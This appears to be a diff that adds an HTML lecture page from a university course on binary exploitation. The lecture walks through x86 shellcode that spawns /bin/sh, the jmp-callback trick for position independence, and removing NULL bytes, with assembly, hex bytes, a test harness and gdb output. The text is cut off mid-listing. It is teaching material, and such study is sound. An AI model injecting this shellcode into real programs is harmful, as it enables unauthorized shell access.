@@ -1,0 +1,719 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Lec. 10: Making Shell Code Exploit Ready</title>
+<!-- 2015-09-21 Mon 17:20 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { color: green; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  td, th { vertical-align:top;  }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012  Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/javascript" src="http://orgmode.org/mathjax/MathJax.js"></script>
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
+    MathJax.Hub.Config({
+        // Only one of the two following lines, depending on user settings
+        // First allows browser-native MathML display, second forces HTML/CSS
+        //  config: ["MMLorHTML.js"], jax: ["input/TeX"],
+            jax: ["input/TeX", "output/HTML-CSS"],
+        extensions: ["tex2jax.js","TeX/AMSmath.js","TeX/AMSsymbols.js",
+                     "TeX/noUndefined.js"],
+        tex2jax: {
+            inlineMath: [ ["\\(","\\)"] ],
+            displayMath: [ ['$$','$$'], ["\\[","\\]"], ["\\begin{displaymath}","\\end{displaymath}"] ],
+            skipTags: ["script","noscript","style","textarea","pre","code"],
+            ignoreClass: "tex2jax_ignore",
+            processEscapes: false,
+            processEnvironments: true,
+            preview: "TeX"
+        },
+        showProcessingMessages: true,
+        displayAlign: "center",
+        displayIndent: "2em",
+
+        "HTML-CSS": {
+             scale: 100,
+             availableFonts: ["STIX","TeX"],
+             preferredFont: "TeX",
+             webFont: "TeX",
+             imageFont: "TeX",
+             showMathMenu: true,
+        },
+        MMLorHTML: {
+             prefer: {
+                 MSIE:    "MML",
+                 Firefox: "MML",
+                 Opera:   "HTML",
+                 other:   "HTML"
+             }
+        }
+    });
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 10: Making Shell Code Exploit Ready</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#sec-1">1. Review: x86 Shell Code</a></li>
+<li><a href="#sec-2">2. Shell code as bytes</a></li>
+<li><a href="#sec-3">3. Fixed references suck</a></li>
+<li><a href="#sec-4">4. Jmp-Callback</a></li>
+<li><a href="#sec-5">5. Null Bytes are the ENEMY</a></li>
+<li><a href="#sec-6">6. Removing NULL bytes</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> Review: x86 Shell Code</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Recall that we can write a bit of shell code like so:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="execve_fixedref.asm">        <span style="color: #ff7f24;">;;  </span><span style="color: #ff7f24;">execve.asm - execute "/bin/sh" and exit if you fail</span>
+
+        <span style="color: #00ffff;">SECTION</span> .data           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Data section</span>
+<span style="color: #87cefa;">shell</span>:          <span style="color: #00ffff;">db</span> <span style="color: #ffa07a;">"/bin/sh"</span>,0  <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">The program we want to run - "/bin/sh"</span>
+
+        <span style="color: #00ffff;">SECTION</span> .text           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+                <span style="color: #00ffff;">global</span> _start   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+<span style="color: #87cefa;">_start</span>:                         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Standard ld entry point</span>
+
+        <span style="color: #00ffff;">push</span>    0               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[1] - NULL</span>
+        <span style="color: #00ffff;">push</span>    shell           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[0] - "/bin/sh"</span>
+
+        <span style="color: #00ffff;">mov</span>     edx,0           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #3 - NULL</span>
+        <span style="color: #00ffff;">mov</span>     ecx,esp         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - address of args array</span>
+        <span style="color: #00ffff;">mov</span>     ebx,shell       <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh"</span>
+        <span style="color: #00ffff;">mov</span>     eax,0xb         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+        <span style="color: #00ffff;">int</span>     0x80            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+        <span style="color: #00ffff;">mov</span>     ebx,0           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Exit code, 0 = normal</span>
+        <span style="color: #00ffff;">mov</span>     eax,1           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for exit</span>
+        <span style="color: #00ffff;">int</span>     0x80            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+</pre>
+</div>
+
+<p>
+This program will execute a shell, and we can see that by assembling
+and linking the program using <code>nasm</code> and <code>ld</code>
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ nasm -f elf execve_fixedref.asm -o execve_fixedref.o; ld execve_fixedref.o -o execve_fixedref
+user@si485H-base:demo$ ./execve_fixedref
+$ echo "SHELL"
+SHELL
+$
+</pre>
+
+<p>
+However, this shell code is not eady for prime time. There are few
+things we need to fix. First we need to look at the shell code as its
+raw bytes of the instruction. Later, we'll need to both fix the
+references as well as remove NULL bytes.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2"><span class="section-number-2">2</span> Shell code as bytes</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+The next thing we want to do is represent the program we wrote in raw
+bytes. To do that, let's look at the <code>objdump</code> output:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel execve_fixedref
+
+execve:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048080 &lt;_start&gt;:
+ 8048080:	6a 00                	push   0x0
+ 8048082:	68 a8 90 04 08       	push   0x80490a8
+ 8048087:	ba 00 00 00 00       	mov    edx,0x0
+ 804808c:	89 e1                	mov    ecx,esp
+ 804808e:	bb a8 90 04 08       	mov    ebx,0x80490a8
+ 8048093:	b8 0b 00 00 00       	mov    eax,0xb
+ 8048098:	cd 80                	int    0x80
+ 804809a:	bb 00 00 00 00       	mov    ebx,0x0
+ 804809f:	b8 01 00 00 00       	mov    eax,0x1
+ 80480a4:	cd 80                	int    0x80
+</pre>
+
+<p>
+The byte valus for the instructions are clearly listed, and we can
+extract them with a nifty little program I wrote in python called <code>hexify</code>:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-sh" id="hexify.sh"><span style="color: #eedd82;">bytes</span>=$(<span style="color: #fa8072;">objdump</span> -d $<span style="color: #eedd82;">1</span> | grep 804 | grep -v <span style="color: #ffa07a;">"&gt;:"</span> | cut -f 2 | tr <span style="color: #ffa07a;">" "</span> <span style="color: #ffa07a;">"\n"</span> | tr -s <span style="color: #ffa07a;">"\n"</span> )
+<span style="color: #eedd82;">hex</span>=$(<span style="color: #fa8072;">echo</span> $<span style="color: #eedd82;">bytes</span> | python -c <span style="color: #ffa07a;">"import sys,re; print ''.join(r'\x%s'%c for c in sys.stdin.read().split())"</span>)
+<span style="color: #b0c4de;">echo</span> <span style="color: #ffa07a;">"$hex"</span>
+</pre>
+</div>
+<p>
+Running this on the program, we get the following hex escaped string:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./hexify.sh execve_fixedref
+\x6a\x00\x68\xa8\x90\x04\x08\xba\x00\x00\x00\x00\x89\xe1\xbb\xa8\x90\x04\x08\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3"><span class="section-number-2">3</span> Fixed references suck</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+The raw bytes we had above is shell code, but not quite. To test it
+out, we can try and execute in some c-code by casting it a function
+pointer. 
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="execve_fixedref.c"><span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(){
+
+  <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">code</span> = <span style="color: #ffa07a;">"\x6a\x00\x68\xa8\x90\x04\x08\xba\x00\x00"</span>
+    <span style="color: #ffa07a;">"\x00\x00\x89\xe1\xbb\xa8\x90\x04\x08\xb8"</span>
+    <span style="color: #ffa07a;">"\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00"</span>
+    <span style="color: #ffa07a;">"\x00\xb8\x01\x00\x00\x00\xcd\x80"</span>;
+
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">cast pointer to function pointer and call</span>
+  ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) code)();
+
+}
+</pre>
+</div>
+
+<p>
+If we then go ahead and try and execute this program, it doesn't work
+as expected (or at all). To see why, we need to open it up in gdb:
+</p>
+<pre class="example">
+(gdb) ds main
+Dump of assembler code for function main:
+   0x080483ed &lt;+0&gt;:	push   ebp
+   0x080483ee &lt;+1&gt;:	mov    ebp,esp
+   0x080483f0 &lt;+3&gt;:	and    esp,0xfffffff0
+   0x080483f3 &lt;+6&gt;:	sub    esp,0x10
+   0x080483f6 &lt;+9&gt;:	mov    DWORD PTR [esp+0xc],0x80484a0
+   0x080483fe &lt;+17&gt;:	mov    eax,DWORD PTR [esp+0xc]
+   0x08048402 &lt;+21&gt;:	call   eax
+   0x08048404 &lt;+23&gt;:	leave  
+   0x08048405 &lt;+24&gt;:	ret    
+End of assembler dump.
+(gdb) x/10i 0x80484a0
+   0x80484a0:	push   0x0
+   0x80484a2:	push   0x80490a8
+   0x80484a7:	mov    edx,0x0
+   0x80484ac:	mov    ecx,esp
+   0x80484ae:	mov    ebx,0x80490a8
+   0x80484b3:	mov    eax,0xb
+   0x80484b8:	int    0x80
+   0x80484ba:	mov    ebx,0x0
+   0x80484bf:	mov    eax,0x1
+   0x80484c4:	int    0x80
+</pre>
+<p>
+First we see that in main we call address 0x80484a0, and if we examine
+that address, we find our hello world program. But, there is a
+problem. We are pushing onto the stack the address 0x80490a8 which
+should be our "/bin/sh" string, but that reference is broken.
+</p>
+<pre class="example">
+(gdb) x/s 0x80490a8
+0x80490a8:	&lt;error: Cannot access memory at address 0x80490a8&gt;
+</pre>
+
+<p>
+Our shell code doesn't work because we have fixed references, instead
+we need to do something different
+</p>
+</div>
+</div>
+<div id="outline-container-sec-4" class="outline-2">
+<h2 id="sec-4"><span class="section-number-2">4</span> Jmp-Callback</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+To remove fixed references, we need to use instructions that will
+calculate a reference for us. There are a few ways to do this, but we
+will use the stand Jmp-Callback trick. Consider the reviced code below:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm" id="execve_jmpcall"><span style="color: #87cefa;">SECTION</span> .text           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+        <span style="color: #00ffff;">global</span> _start   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+
+<span style="color: #87cefa;">_start</span>:                         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Standard ld entry point</span>
+        <span style="color: #00ffff;">jmp</span>  callback
+
+<span style="color: #87cefa;">dowork</span>:
+        <span style="color: #00ffff;">pop</span> esi                 <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">esi now holds address of "/bin/sh</span>
+        <span style="color: #00ffff;">push</span>    0               <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[1] - NULL</span>
+        <span style="color: #00ffff;">push</span>    esi             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[0] - "/bin/sh"</span>
+
+        <span style="color: #00ffff;">mov</span>     edx,0           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #3 - NULL</span>
+        <span style="color: #00ffff;">mov</span>     ecx,esp         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - address of args array</span>
+        <span style="color: #00ffff;">mov</span>     ebx,esi         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh"</span>
+        <span style="color: #00ffff;">mov</span>     eax,0xb         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve</span>
+        <span style="color: #00ffff;">int</span>     0x80            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+        <span style="color: #00ffff;">mov</span>     ebx,0           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Exit code, 0 = normal</span>
+        <span style="color: #00ffff;">mov</span>     eax,1           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for exit</span>
+        <span style="color: #00ffff;">int</span>     0x80            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+<span style="color: #87cefa;">callback</span>:
+        <span style="color: #00ffff;">call</span> dowork    <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">call pushes the next address onto stack,</span>
+                       <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">which is address of "/bin/sh" </span>
+        <span style="color: #00ffff;">db</span> <span style="color: #ffa07a;">"/bin/sh"</span>,0 <span style="color: #ff7f24;">;</span>
+</pre>
+</div>
+
+<p>
+The first thing that happens in <code>_start</code> is we jump to the <code>callback</code>
+tag, which in terns call's the <code>dowork</code>. That might seem like a lot of
+indirection, but from that indirection we gain the reference to the
+string "/bin/sh".
+</p>
+
+<p>
+Why? A call command not only jumps to the reference indicated, but it
+will also push onto the stack the return address. The return address
+is the <i>next</i> address to execute, which in the case above is address
+of the data command for "/bin/sh" &#x2026; exactly what we need. At
+<code>dowork</code> we can pop the return address off the stack, i.e., the
+address of the string "/bin/sh" and use that address. In particular,
+we save that address in the <code>esi</code> register.
+</p>
+
+<p>
+Now, we can hexify and insert that code into C and see if that works:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c" id="execve_jmpcall.c"><span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(){
+
+  <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">code</span> = <span style="color: #ffa07a;">"\x6a\x00\x68\xa8\x90\x04\x08\xba\x00\x00"</span>
+    <span style="color: #ffa07a;">"\x00\x00\x89\xe1\xbb\xa8\x90\x04\x08\xb8"</span>
+    <span style="color: #ffa07a;">"\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00"</span>
+    <span style="color: #ffa07a;">"\x00\xb8\x01\x00\x00\x00\xcd\x80"</span>;
+
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">cast pointer to function pointer and call</span>
+  ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) code)();
+
+}
+</pre>
+</div>
+<pre class="example">
+user@si485H-base:demo$ gcc execve_jmpcall.c -o execve_jmpcall
+user@si485H-base:demo$ ./execve_jmpcall
+$
+</pre>
+
+<p>
+And now we are in business &#x2026; sort of.
+</p>
+</div>
+</div>
+<div id="outline-container-sec-5" class="outline-2">
+<h2 id="sec-5"><span class="section-number-2">5</span> Null Bytes are the ENEMY</h2>
+<div class="outline-text-2" id="text-5">
+<p>
+The next challenge is using our shell code through an exploit. We
+won't do that exactly, but we can simulate what that might be like
+with this simple program:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-c" id="dummy_exploit.c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">code</span>[1024];
+
+  strncpy(code,argv[1],1024);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">cast pointer to function pointer and call</span>
+  ((<span style="color: #98fb98;">void</span>(*)(<span style="color: #98fb98;">void</span>)) code)();
+
+}
+</pre>
+</div>
+<p>
+The program simply reads a command line arguments, loads it into a
+buffer, and then executes the buffer. This is essentially what we want
+to happen when we exploit a program, but a lot of the work is done for
+us. 
+</p>
+
+<p>
+What we'd like to happen is that we can do this with our shell code hex:
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./hexify.sh execve_jmpcall
+\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+user@si485H-base:demo$ ./dummy_exploit $(printf "\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
+Segmentation fault (core dumped)
+</pre>
+<p>
+We have a problem. Let's execute this under gdb, and we can see where the problem arises:
+</p>
+
+<pre class="example">
+(gdb) ds main
+Dump of assembler code for function main:
+   0x0804841d &lt;+0&gt;:	push   ebp
+   0x0804841e &lt;+1&gt;:	mov    ebp,esp
+   0x08048420 &lt;+3&gt;:	and    esp,0xfffffff0
+   0x08048423 &lt;+6&gt;:	sub    esp,0x410
+   0x08048429 &lt;+12&gt;:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804842c &lt;+15&gt;:	add    eax,0x4
+   0x0804842f &lt;+18&gt;:	mov    eax,DWORD PTR [eax]
+   0x08048431 &lt;+20&gt;:	mov    DWORD PTR [esp+0x8],0x400
+   0x08048439 &lt;+28&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x0804843d &lt;+32&gt;:	lea    eax,[esp+0x10]
+   0x08048441 &lt;+36&gt;:	mov    DWORD PTR [esp],eax
+   0x08048444 &lt;+39&gt;:	call   0x8048310 &lt;strncpy@plt&gt;
+   0x08048449 &lt;+44&gt;:	lea    eax,[esp+0x10]
+   0x0804844d &lt;+48&gt;:	call   eax
+   0x0804844f &lt;+50&gt;:	leave  
+   0x08048450 &lt;+51&gt;:	ret    
+End of assembler dump.
+(gdb) br *0x0804844d
+Breakpoint 1 at 0x804844d
+(gdb) r $(printf "\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
+Starting program: /home/user/git/si485-binary-exploits/lec/09/demo/dummy_exploit $(printf "\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
+
+Breakpoint 1, 0x0804844d in main ()
+(gdb) x/10i $esp+0x10
+   0xbffff250:	jmp    0xbffff252
+   0xbffff252:	add    BYTE PTR [eax],al
+   0xbffff254:	add    BYTE PTR [eax],al
+   0xbffff256:	add    BYTE PTR [eax],al
+   0xbffff258:	add    BYTE PTR [eax],al
+   0xbffff25a:	add    BYTE PTR [eax],al
+   0xbffff25c:	add    BYTE PTR [eax],al
+   0xbffff25e:	add    BYTE PTR [eax],al
+   0xbffff260:	add    BYTE PTR [eax],al
+   0xbffff262:	add    BYTE PTR [eax],al
+</pre>
+
+<p>
+In the above gdb execution, first we set a break point right before
+the call so that we can inspect the address that will be called,
+<code>$esp+0x10</code>. Unfortunately, if we look closely, we see that the jmp is
+there, which is our first command, but then we are in trouble. There
+are a bunch of nonsense commands.
+</p>
+
+<p>
+What happened? Lets look more closely at our command line argument:
+</p>
+<pre class="example">
+$(printf "\xeb\x20\x5e\x6a\x00\x56\xba\x00\x00\x00\x00\x89\xe1\x89\xf3\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
+</pre>
+<p>
+You see that 5 bytes in, there is a NULL (\x00) which means the
+<code>strcpy()</code> command will stop copying there. 
+</p>
+
+<p>
+<b>We need to remove NULL bytes!</b>
+</p>
+</div>
+</div>
+
+<div id="outline-container-sec-6" class="outline-2">
+<h2 id="sec-6"><span class="section-number-2">6</span> Removing NULL bytes</h2>
+<div class="outline-text-2" id="text-6">
+<p>
+To remove NULL bytes, we need to get creative. Let's look at the
+objdump of our previous version of the shell code to get a sense of
+where we are at.
+</p>
+<pre class="example">
+user@si485H-base:demo$ objdump -d -M intel execve_calljmp
+
+execve_calljmp:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060:	eb 20                	jmp    8048082 &lt;callback&gt;
+
+08048062 &lt;dowork&gt;:
+ 8048062:	5e                   	pop    esi
+ 8048063:	6a 00                	push   0x0
+ 8048065:	56                   	push   esi
+ 8048066:	ba 00 00 00 00       	mov    edx,0x0
+ 804806b:	89 e1                	mov    ecx,esp
+ 804806d:	89 f3                	mov    ebx,esi
+ 804806f:	b8 0b 00 00 00       	mov    eax,0xb
+ 8048074:	cd 80                	int    0x80
+ 8048076:	bb 00 00 00 00       	mov    ebx,0x0
+ 804807b:	b8 01 00 00 00       	mov    eax,0x1
+ 8048080:	cd 80                	int    0x80
+
+08048082 &lt;callback&gt;:
+ 8048082:	e8 db ff ff ff       	call   8048062 &lt;dowork&gt;
+ 8048087:	2f                   	das    
+ 8048088:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
+ 804808b:	2f                   	das    
+ 804808c:	73 68                	jae    80480f6 &lt;callback+0x74&gt;
+</pre>
+
+<p>
+You can see where the NULL's come from. There are two big problems:
+</p>
+
+<ul class="org-ul">
+<li><code>push 0x0</code> : pushing null on the stack requires a null value in the bytes
+</li>
+<li><code>push e*x</code> : pushing a 4 byte register storing 1 byte of values require null bytes
+</li>
+</ul>
+
+<p>
+To solve one of these problem, we need to create NULL bytes without
+actually writing any NULL bytes. The most affective way to do this is
+with xor. Recall that the xor of a value with itself is always
+zero. To solve the other problem, we need to make sure we use BYTE
+PTR's instead of DWORD PTR's, which means using the <code>al</code> <code>bl</code> <code>cl</code> and
+<code>dl</code> registers. We can write our code like so.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">SECTION</span> .text           <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Code section</span>
+        <span style="color: #00ffff;">global</span> _start   <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Make label available to linker</span>
+
+<span style="color: #87cefa;">_start</span>:                         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Standard ld entry point</span>
+        <span style="color: #00ffff;">jmp</span>  callback
+
+<span style="color: #87cefa;">dowork</span>:
+
+
+        <span style="color: #00ffff;">pop</span> esi                 <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">esi now holds address of "/bin/sh</span>
+
+        <span style="color: #00ffff;">xor</span>     eax,eax         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">zero out eax</span>
+        <span style="color: #00ffff;">push</span>    eax             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[1] - NULL</span>
+        <span style="color: #00ffff;">push</span>    esi             <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">args[0] - "/bin/sh"</span>
+
+        <span style="color: #00ffff;">xor</span>     edx,edx         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #3 - NULL (zero out edx)</span>
+        <span style="color: #00ffff;">mov</span>     ecx,esp         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #2 - address of args array</span>
+        <span style="color: #00ffff;">mov</span>     ebx,esi         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Param #1 - "/bin/sh"</span>
+        <span style="color: #00ffff;">mov</span>     al,0xb          <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for execve (use al mov)</span>
+        <span style="color: #00ffff;">int</span>     0x80            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+
+        <span style="color: #00ffff;">xor</span>     ebx,ebx         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Exit code, 0 = normal</span>
+        <span style="color: #00ffff;">xor</span>     eax,eax         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">zero eax</span>
+        <span style="color: #00ffff;">mov</span>     al,1            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">System call number for exit</span>
+        <span style="color: #00ffff;">int</span>     0x80            <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">Interrupt 80 hex - invoke system call</span>
+
+<span style="color: #87cefa;">callback</span>:
+        <span style="color: #00ffff;">call</span> dowork    <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">call pushes the next address onto stack,</span>
+                       <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">which is address of "/bin/sh" </span>
